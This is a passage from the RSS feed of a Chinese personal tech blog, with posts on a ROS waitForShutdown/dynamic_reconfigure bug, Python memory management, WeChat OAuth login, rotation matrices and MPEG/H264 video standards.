      <link>/2024/03/%E4%BD%BF%E7%94%A8-roswaitforshutdown-%E5%AF%BC%E8%87%B4-dynamic_reconfigureserver-%E6%97%A0%E6%B3%95%E6%AD%A3%E5%B8%B8%E8%8E%B7%E5%8F%96%E9%85%8D%E7%BD%AE%E6%9B%B4%E6%96%B0%E7%9A%84%E9%97%AE%E9%A2%98/</link>
      <pubDate>Sat, 23 Mar 2024 11:43:22 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2024/03/%E4%BD%BF%E7%94%A8-roswaitforshutdown-%E5%AF%BC%E8%87%B4-dynamic_reconfigureserver-%E6%97%A0%E6%B3%95%E6%AD%A3%E5%B8%B8%E8%8E%B7%E5%8F%96%E9%85%8D%E7%BD%AE%E6%9B%B4%E6%96%B0%E7%9A%84%E9%97%AE%E9%A2%98/</guid>
      <description>&lt;!--toc--&gt;
&lt;p&gt;最近用 &lt;a href=&#34;http://wiki.ros.org/roscpp/Overview/Callbacks%20and%20Spinning&#34;&gt;AsyncSpinner&lt;/a&gt; 做了一个独立 callback queue 的 ROS 程序，其中使用了 dynamic_reconfigure 的的方法进行动态配置修改，但程序跑起来之后发现只有在刚刚跑起来的初始化 dynamic_reconfigure::Server 的时候进行了一次配置加载和更新，后面无论用 rqt_configure 设置都无法成功调用到程序的配置更新 callback。这段代码参考了 &lt;a href=&#34;http://wiki.ros.org/roscpp/Overview/Callbacks%20and%20Spinning&#34;&gt;AsyncSpinner&lt;/a&gt; 中的一段例子代码：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ros::AsyncSpinner spinner(4); // Use 4 threads
spinner.start();
ros::waitForShutdown();
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;阅读 ROS 代码后发现了问题出在了使用 &amp;ldquo;ros::waitForShutdown()&amp;rdquo; 上面。&amp;ldquo;waitForShutdown()&amp;rdquo; 只是一个检查 ROS 是否正常的循环，并不作任何 spinner 处理。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;void waitForShutdown()
{
  while (ok())
  {
    WallDuration(0.05).sleep();
  }
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;而 dynamic_reconfigure::Server 默认会创建一个 NodeHandle，默认情况下 NodeHandle 需要使用 spinner 进行消息循环的处理，显然 waitForShutdown() 并没有这么处理。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;  Server(const ros::NodeHandle &amp;amp;nh = ros::NodeHandle(&amp;#34;~&amp;#34;)) :
    node_handle_(nh),
    mutex_(own_mutex_),
    own_mutex_warn_(true)
  {
    init();
  }
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;解决方法就是把 &amp;ldquo;ros::waitForShutdown()&amp;rdquo; 用 &amp;ldquo;ros::spin()&amp;rdquo; 替代就可以解决。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>django-rest-framework 和 simplejwt 的类关系</title>
      <link>/2023/12/django-rest-framework-%E5%92%8C-simplejwt-%E7%9A%84%E7%B1%BB%E5%85%B3%E7%B3%BB/</link>
      <pubDate>Sun, 10 Dec 2023 11:40:29 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2023/12/django-rest-framework-%E5%92%8C-simplejwt-%E7%9A%84%E7%B1%BB%E5%85%B3%E7%B3%BB/</guid>
      <description>&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/Programming/Python/django-rest-framework/django-rest-framework.png&#34; alt=&#34;django_rest_framework&#34;&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>PCL 点云数据过滤处理</title>
      <link>/2023/11/pcl-%E7%82%B9%E4%BA%91%E6%95%B0%E6%8D%AE%E8%BF%87%E6%BB%A4%E5%A4%84%E7%90%86/</link>
      <pubDate>Wed, 22 Nov 2023 12:00:01 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2023/11/pcl-%E7%82%B9%E4%BA%91%E6%95%B0%E6%8D%AE%E8%BF%87%E6%BB%A4%E5%A4%84%E7%90%86/</guid>
      <description>&lt;h1 id=&#34;点云过滤&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%82%b9%e4%ba%91%e8%bf%87%e6%bb%a4&#34;&gt;
        ##
    &lt;/a&gt;
    点云过滤
&lt;/div&gt;
&lt;/h1&gt;</description>
    </item>
    
    <item>
      <title>Python 内存管理</title>
      <link>/2023/11/python-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</link>
      <pubDate>Tue, 21 Nov 2023 14:40:28 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2023/11/python-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</guid>
      <description>&lt;h1 id=&#34;引用和对象&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%bc%95%e7%94%a8%e5%92%8c%e5%af%b9%e8%b1%a1&#34;&gt;
        ##
    &lt;/a&gt;
    引用和对象
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/Programming/Python/python-memory/python-obj-ref.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;python 会缓冲短字符串和小整数对象（-5 ~ 256），多个引用会引用同一个对象&lt;/li&gt;
&lt;li&gt;python 不会缓冲场字符串、容器、其他对象&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;对象&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%af%b9%e8%b1%a1&#34;&gt;
        #
    &lt;/a&gt;
    对象
&lt;/div&gt;
&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;typedef struct_object{

　　int ob_refcnt;

　　struct_typeobject *ob_type;

}PyObject;
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;ob_refcnt：引用计数&lt;/li&gt;
&lt;li&gt;ob_type：类型的类型（元类型 metatype）&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;对象引用计数&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%af%b9%e8%b1%a1%e5%bc%95%e7%94%a8%e8%ae%a1%e6%95%b0&#34;&gt;
        ##
    &lt;/a&gt;
    对象引用计数
&lt;/div&gt;
&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sys.getrefcount()
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;sys.getrefcount() 调用时因为 getrefcount() 也会增加引用，所以结果会比实际 ref count 大 1&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;gc&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#gc&#34;&gt;
        ##
    &lt;/a&gt;
    GC
&lt;/div&gt;
&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; import gc
&amp;gt;&amp;gt;&amp;gt; gc.get_threshold()
(700, 10, 10)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;代际和 GC：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;0 代：年轻代，对应 get_threshold() 第 1 项（700）
&lt;ul&gt;
&lt;li&gt;当 “新分配的对象(object allocation) - 释放的对象(object deallocation)” 大于 700 时触发 0 代扫描&lt;/li&gt;
&lt;li&gt;当引用计数为 0 时放入 1 代&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;1 代：中年代，对应 get_threshold() 第 2 项（10）
&lt;ul&gt;
&lt;li&gt;当 0 代进行了 10 次扫描时触发扫描&lt;/li&gt;
&lt;li&gt;当引用计数为 0 时放入 2 代&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2 代：老年代，对应 get_threshold() 第 3 项（10）
&lt;ul&gt;
&lt;li&gt;当 1 代进行了 10 次扫描时出发扫描&lt;/li&gt;
&lt;li&gt;当引用技术为 0 释放&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;手动触发 GC&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; result = gc.collect()
&amp;gt;&amp;gt;&amp;gt; print(result)
5
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;内存池机制&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%86%85%e5%ad%98%e6%b1%a0%e6%9c%ba%e5%88%b6&#34;&gt;
        ##
    &lt;/a&gt;
    内存池机制
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;内存管理空间结构&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%86%85%e5%ad%98%e7%ae%a1%e7%90%86%e7%a9%ba%e9%97%b4%e7%bb%93%e6%9e%84&#34;&gt;
        #
    &lt;/a&gt;
    内存管理空间结构
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/Programming/Python/python-memory/memory-hierarchy.png&#34; alt=&#34;memory hierarchy&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;arena&lt;/li&gt;
&lt;li&gt;pool&lt;/li&gt;
&lt;li&gt;block&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;分层&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%88%86%e5%b1%82&#34;&gt;
        #
    &lt;/a&gt;
    分层
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/Programming/Python/python-memory/python-memory-layers.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;分配调用栈：
&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/Programming/Python/python-memory/allocation-stack.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/Programming/Python/python-memory/allocation.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;第-0-层&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%ac%ac-0-%e5%b1%82&#34;&gt;
        ##
    &lt;/a&gt;
    第 0 层
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;对接 OS 分配 python 所需内存&lt;/p&gt;
&lt;h3 id=&#34;第-1-层&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%ac%ac-1-%e5%b1%82&#34;&gt;
        ##
    &lt;/a&gt;
    第 1 层
&lt;/div&gt;
&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;管理 arena&lt;/li&gt;
&lt;li&gt;arena 大小 256 KB&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;第-2-层&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%ac%ac-2-%e5%b1%82&#34;&gt;
        ##
    &lt;/a&gt;
    第 2 层
&lt;/div&gt;
&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;管理 pool 和 block&lt;/li&gt;
&lt;li&gt;pool 大小 4 KB&lt;/li&gt;
&lt;li&gt;block 小于 4 KB&lt;/li&gt;
&lt;li&gt;block 状态：
&lt;ul&gt;
&lt;li&gt;已分配&lt;/li&gt;
&lt;li&gt;使用完毕&lt;/li&gt;
&lt;li&gt;未使用&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;第-3-层&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%ac%ac-3-%e5%b1%82&#34;&gt;
        ##
    &lt;/a&gt;
    第 3 层
&lt;/div&gt;
&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;管理 python 对象使用的内存&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%8f%82%e8%80%83&#34;&gt;
        ##
    &lt;/a&gt;
    参考
&lt;/div&gt;
&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://bbs.huaweicloud.com/blogs/382075&#34;&gt;https://bbs.huaweicloud.com/blogs/382075&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://juejin.cn/post/6856235545220415496&#34;&gt;https://juejin.cn/post/6856235545220415496&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    
    <item>
      <title>Wechat_development</title>
      <link>/2023/11/wechat_development/</link>
      <pubDate>Wed, 08 Nov 2023 23:40:06 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2023/11/wechat_development/</guid>
      <description>&lt;h1 id=&#34;订阅号与服务号的区别&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e8%ae%a2%e9%98%85%e5%8f%b7%e4%b8%8e%e6%9c%8d%e5%8a%a1%e5%8f%b7%e7%9a%84%e5%8c%ba%e5%88%ab&#34;&gt;
        ##
    &lt;/a&gt;
    订阅号与服务号的区别
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://developers.weixin.qq.com/doc/offiaccount/Getting_Started/Explanation_of_interface_privileges.html&#34;&gt;https://developers.weixin.qq.com/doc/offiaccount/Getting_Started/Explanation_of_interface_privileges.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;订阅号侧重向用户推送文章，服务号侧重对用户做服务（交易等）但发送文章很少&lt;/p&gt;
&lt;h1 id=&#34;网页开发&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%bd%91%e9%a1%b5%e5%bc%80%e5%8f%91&#34;&gt;
        ##
    &lt;/a&gt;
    网页开发
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;机制：网页授权
场景：在微信中打开第三方网页，可以用网页授权机制获取用户信息&lt;/p&gt;
&lt;p&gt;scope&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;snsapi_base: 获取进入页面的用户 openid（静默授权）&lt;/li&gt;
&lt;li&gt;snsapi_userinfo: 获取进入页面的用户&lt;strong&gt;基本信息&lt;/strong&gt;，需要用户手动同意，无需用户关注&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;网页获取用户信息&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%bd%91%e9%a1%b5%e8%8e%b7%e5%8f%96%e7%94%a8%e6%88%b7%e4%bf%a1%e6%81%af&#34;&gt;
        #
    &lt;/a&gt;
    网页获取用户信息
&lt;/div&gt;
&lt;/h2&gt;
&lt;h3 id=&#34;scope&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#scope&#34;&gt;
        ##
    &lt;/a&gt;
    scope
&lt;/div&gt;
&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;snsapi_base&lt;/li&gt;
&lt;li&gt;snsapi_userinfo&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://open.weixin.qq.com/connect/oauth2/authorize?appid=APPID&amp;amp;redirect_uri=REDIRECT_URI&amp;amp;response_type=code&amp;amp;scope=SCOPE&amp;amp;state=STATE#wechat_redirect
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&#34;https://open.weixin.qq.com/connect/oauth2/authorize?appid=wx90348171d6a27b83&amp;amp;redirect_uri=REDIRECT_URI&amp;amp;response_type=code&amp;amp;scope=SCOPE&amp;amp;state=STATE#wechat_redirect&#34;&gt;https://open.weixin.qq.com/connect/oauth2/authorize?appid=wx90348171d6a27b83&amp;amp;redirect_uri=REDIRECT_URI&amp;amp;response_type=code&amp;amp;scope=SCOPE&amp;amp;state=STATE#wechat_redirect&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;通过网页页面获取用户信息的方法：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;引导用户点击带 redirect_uri 的内容（比如，通过菜单设置: &lt;a href=&#34;https://open.weixin.qq.com/connect/oauth2/authorize?appid=wx90348171d6a27b83&amp;amp;redirect_uri=REDIRECT_URI&amp;amp;response_type=code&amp;amp;scope=SCOPE&amp;amp;state=STATE#wechat_redirect&#34;&gt;https://open.weixin.qq.com/connect/oauth2/authorize?appid=wx90348171d6a27b83&amp;amp;redirect_uri=REDIRECT_URI&amp;amp;response_type=code&amp;amp;scope=SCOPE&amp;amp;state=STATE#wechat_redirect&lt;/a&gt;）&lt;/li&gt;
&lt;li&gt;用户点击后经过腾讯 oauth2 回调到 redirect_uri，并且带有 &amp;lsquo;code&amp;rsquo; 参数&lt;/li&gt;
&lt;li&gt;页面处理 code 信息，例如将 code 作为一个参数带入调用后端的 API 接口&lt;/li&gt;
&lt;li&gt;后端调用腾讯 sns/userinfo 接口获取用户信息
&lt;ol&gt;
&lt;li&gt;首先调用 &lt;a href=&#34;https://api.weixin.qq.com/sns/oauth2/access_token&#34;&gt;https://api.weixin.qq.com/sns/oauth2/access_token&lt;/a&gt; 获取 access token&lt;/li&gt;
&lt;li&gt;再调用 &lt;a href=&#34;https://api.weixin.qq.com/sns/userinfo&#34;&gt;https://api.weixin.qq.com/sns/userinfo&lt;/a&gt; 获取用户信息&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;weixin 与手机号绑定&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;引导用户进入带oauth2回调页面，获取用户 code&lt;/li&gt;
&lt;li&gt;使用 code 检查用户信息
&lt;ul&gt;
&lt;li&gt;如果已经存在用户，则返回 token 并正常打开 next 页面&lt;/li&gt;
&lt;li&gt;如果不存在，则进入注册信息绑定页面，绑定手机号（短信验证）
&lt;ul&gt;
&lt;li&gt;验证通过后，创建用户并返回 token 并正常打开 next 页面&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;网站实现扫码登陆方法&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%bd%91%e7%ab%99%e5%ae%9e%e7%8e%b0%e6%89%ab%e7%a0%81%e7%99%bb%e9%99%86%e6%96%b9%e6%b3%95&#34;&gt;
        ##
    &lt;/a&gt;
    网站实现扫码登陆方法：
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;https://developers.weixin.qq.com/doc/oplatform/Website_App/WeChat_Login/Wechat_Login.html&#34;&gt;https://developers.weixin.qq.com/doc/oplatform/Website_App/WeChat_Login/Wechat_Login.html&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;步骤1：嵌入下面 JS 文件&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://res.wx.qq.com/connect/zh_CN/htmledition/js/wxLogin.js
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;步骤2：在需要使用微信登录的地方实例以下JS对象：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt; var obj = new WxLogin({
 self_redirect:true,
 id:&amp;#34;login_container&amp;#34;, 
 appid: &amp;#34;&amp;#34;, 
 scope: &amp;#34;&amp;#34;, 
 redirect_uri: &amp;#34;&amp;#34;,
  state: &amp;#34;&amp;#34;,
 style: &amp;#34;&amp;#34;,
 href: &amp;#34;&amp;#34;
 });
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;业务域名&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>左乘/右乘旋转</title>
      <link>/2023/10/%E5%B7%A6%E4%B9%98/%E5%8F%B3%E4%B9%98%E6%97%8B%E8%BD%AC/</link>
      <pubDate>Wed, 25 Oct 2023 14:38:55 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2023/10/%E5%B7%A6%E4%B9%98/%E5%8F%B3%E4%B9%98%E6%97%8B%E8%BD%AC/</guid>
      <description>&lt;h1 id=&#34;左乘旋转&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%b7%a6%e4%b9%98%e6%97%8b%e8%bd%ac&#34;&gt;
        ##
    &lt;/a&gt;
    左乘旋转
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;左乘对应的物理转动为绕固定坐标轴旋转&lt;/p&gt;
&lt;p&gt;下图表示的是左乘  $R_z(\alpha) R_y(\beta) R_x(\gamma)$&lt;/p&gt;
&lt;p&gt;对应的旋转为：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;绕固定坐标系 X 轴旋转 $\gamma$&lt;/li&gt;
&lt;li&gt;绕固定坐标系 Y 轴旋转 $\beta$&lt;/li&gt;
&lt;li&gt;绕固定坐标系 Z 轴旋转 $\alpha$&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/Robotics/left_right_rotation/xyz%E5%9B%BA%E5%AE%9A%E8%A7%92.png&#34; alt=&#34;左乘旋转&#34;&gt;&lt;/p&gt;
&lt;p&gt;右乘旋转
绕自身坐标系旋转&lt;/p&gt;
&lt;p&gt;下图对应的是右乘 $R_z(\alpha) R_y(\beta) R_x(\gamma)$&lt;/p&gt;
&lt;p&gt;对应的旋转为：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;绕 Z 轴旋转 $\alpha$&lt;/li&gt;
&lt;li&gt;绕旋转后得到的坐标系 Y 轴旋转 $\beta$&lt;/li&gt;
&lt;li&gt;绕旋转后得到的坐标系 X 轴旋转 $\gamma$&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/Robotics/left_right_rotation/zyx%E6%AC%A7%E6%8B%89%E8%A7%92.png&#34; alt=&#34;右乘&#34;&gt;&lt;/p&gt;
&lt;p&gt;This is an inline \(a^*=x-b^*\) equation.&lt;/p&gt;
&lt;p&gt;These are block equations:&lt;/p&gt;
\[a^*=x-b^*\]
\[ a^*=x-b^* \]
\[
a^*=x-b^*
\]
&lt;p&gt;These are block equations using alternate delimiters:&lt;/p&gt;
$$a^*=x-b^*$$
$$ a^*=x-b^* $$
$$
a^*=x-b^*
$$</description>
    </item>
    
    <item>
      <title>多媒体格式标准、H264 编码与 MP4 格式简要介绍</title>
      <link>/2023/08/%E5%A4%9A%E5%AA%92%E4%BD%93%E6%A0%BC%E5%BC%8F%E6%A0%87%E5%87%86h264-%E7%BC%96%E7%A0%81%E4%B8%8E-mp4-%E6%A0%BC%E5%BC%8F%E7%AE%80%E8%A6%81%E4%BB%8B%E7%BB%8D/</link>
      <pubDate>Wed, 09 Aug 2023 15:15:25 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2023/08/%E5%A4%9A%E5%AA%92%E4%BD%93%E6%A0%BC%E5%BC%8F%E6%A0%87%E5%87%86h264-%E7%BC%96%E7%A0%81%E4%B8%8E-mp4-%E6%A0%BC%E5%BC%8F%E7%AE%80%E8%A6%81%E4%BB%8B%E7%BB%8D/</guid>
      <description>&lt;h1 id=&#34;1标准概括&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#1%e6%a0%87%e5%87%86%e6%a6%82%e6%8b%ac&#34;&gt;
        ##
    &lt;/a&gt;
    1.标准概括
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;11mpeg-1&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#11mpeg-1&#34;&gt;
        #
    &lt;/a&gt;
    1.1.MPEG-1
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;主要用于 CD / VCD 光盘时代的音视频压缩。&lt;/p&gt;
&lt;p&gt;MPEG-1可以按照分层的概念来理解，一个MPEG-1视频编码序列分为三个层次，从顶层到最底层依次是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;图像组层（GOP: Group of Picture）&lt;/li&gt;
&lt;li&gt;帧层（frame），每个 GOP 可以包含多个 frame&lt;/li&gt;
&lt;li&gt;像条层（slice），每个 frame 可以包含多个 slice&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;MPEG-1 定义的帧种类：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;I-图像／帧（节点编码图像，intra coded picture）参考图像，相当于一个固定影像，且独立于其它的图像类型。每个图像组群由此类型的图像开始。编码时独立编码，仅适用帧内编码技术，因而解码时不参考其他帧，类似JPEG编码。&lt;/li&gt;
&lt;li&gt;P-图像／帧（预测编码图像，predictive coded picture）包含来自先前的I或P-画格的差异信息。编码时使用运动补偿和运动估计，采用前向估计，参考之前的I-帧或者P-帧去预测该P格。&lt;/li&gt;
&lt;li&gt;B-图像／帧（前后预测编码图像，bidirectionally predictive coded pictures）包含来自先前和／或之后的I或 P-画格的差异信息。编码也使用运动补偿和运动估计，预估采用前向估计、后向估计或是双向估计，主要参考前面的或者后面的I格或者P格。&lt;/li&gt;
&lt;li&gt;D-图像／帧（指示编码图像，DC direct coded picture）用于快速进带。仅由DC直流分量构造的图像，可在低比特率的时候做浏览用。实际编码中很少使用。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;12mpeg-2&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#12mpeg-2&#34;&gt;
        #
    &lt;/a&gt;
    1.2.MPEG-2
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;MPEG-2 是 DVD 和数字电视广播时代产生的音视频编码标准，但也被应用于后来的高清电视（HDTV）和蓝光光盘。&lt;/p&gt;
&lt;p&gt;MPEG-2 的编码码流分为六个层次，从顶层到最底层依次是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;视频序列层（Sequence）&lt;/li&gt;
&lt;li&gt;图像组层（GOP: Group of Picture）&lt;/li&gt;
&lt;li&gt;图像层（Picture）&lt;/li&gt;
&lt;li&gt;像条层（Slice）&lt;/li&gt;
&lt;li&gt;宏块层（Macro Block）&lt;/li&gt;
&lt;li&gt;像块层（Block）&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;13mpeg-3&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#13mpeg-3&#34;&gt;
        #
    &lt;/a&gt;
    1.3.MPEG-3
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;MPEG-3是MPEG组织制定的视频和音频压缩标准。本来的目标是为HDTV提供20-40Mbps视频压缩技术。在标准制定的过程中，委员会很快发现MPEG-2技术足以获取类似的效果，因此将其合并到MPEG-2，成为MPEG-2的延伸。&lt;/p&gt;
&lt;h3 id=&#34;mp3-vs-mpeg-3&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#mp3-vs-mpeg-3&#34;&gt;
        ##
    &lt;/a&gt;
    MP3 vs MPEG-3
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;MP3 是 MPEG-1 音频 Layer-3 部分，MPEG-1 的音频格式有 3 代，MP3 是第三代。&lt;/p&gt;
&lt;p&gt;MPEG-3 是音视频标准，目前已经属于 MPEG-2 的一部分。&lt;/p&gt;
&lt;h2 id=&#34;14-mpeg-4&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#14-mpeg-4&#34;&gt;
        #
    &lt;/a&gt;
    1.4. MPEG-4
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;MPEG-4 是由一系列标准组成&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;第一部分（ISO/IEC 14496-1）：系统：描述视频和音频数据流的控制、同步以及混合方式（即混流Multiplexing，简写为MUX）。&lt;/p&gt;
&lt;p&gt;第二部分（ISO/IEC 14496-2）：视频：定义一个对各种视觉信息（包括自然视频、静止纹理、计算机合成图形等等）的编解码器。（例如XviD编码就属于MPEG-4 Part 2）&lt;/p&gt;
&lt;p&gt;第三部分（ISO/IEC 14496-3）：音频：定义一个对各种音频信号进行编码的编解码器的集合。包括高级音频编码（Advanced Audio Coding，缩写为AAC）的若干变形和其他一些音频/语音编码工具(如Audio Lossless Coding,缩写为ALS)。&lt;/p&gt;
&lt;p&gt;第四部分（ISO/IEC 14496-4）：一致性：定义对本标准其他的部分进行一致性测试的程序。&lt;/p&gt;
&lt;p&gt;第五部分（ISO/IEC 14496-5）：参考软件：提供用于演示功能和说明本标准其他部分功能的软件。&lt;/p&gt;
&lt;p&gt;第六部分（ISO/IEC 14496-6）：多媒体传输集成框架（DMIF for Delivery Multimedia Integration Framework）&lt;/p&gt;
&lt;p&gt;第七部分（ISO/IEC 14496-7）：优化的参考软件：提供对实现进行优化的例子（这里的实现指的是第五部分）。&lt;/p&gt;
&lt;p&gt;第八部分（ISO/IEC 14496-8）：在IP网络上传输：定义在IP网络上传输MPEG-4内容的方式。&lt;/p&gt;
&lt;p&gt;第九部分（ISO/IEC 14496-9）：参考硬件：提供用于演示怎样在硬件上实现本标准其他部分功能的硬件设计方案。&lt;/p&gt;
